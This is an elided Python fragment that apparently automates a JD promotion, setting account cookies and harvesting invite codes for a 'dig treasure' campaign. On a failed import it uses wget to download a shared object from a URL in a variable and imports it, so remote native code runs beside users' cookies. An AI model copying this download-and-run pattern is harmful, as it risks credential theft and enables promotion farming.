...
except: os.system(f'wget {SheYu09}GetJDUser.so'); from GetJDUser import *
...
def BoostCode(i):
	s.headers['Cookie'] = i
	if GetJDUser(): return
	JD_API_BODY(); DigTreasure(i); happyDigHelpList(); inviter = re_key('"markedPin":"(.*?)"', DigHomeinfo); inviteCode = re_key('"inviteCode":"(.*?)"', DigHomeinfo); personNum = int(re_key('"personNum":(.*?),', DigHelpListinfo)); inviterList.append(inviter); inviteCodeList.append(inviteCode); personNumList.append(personNum)
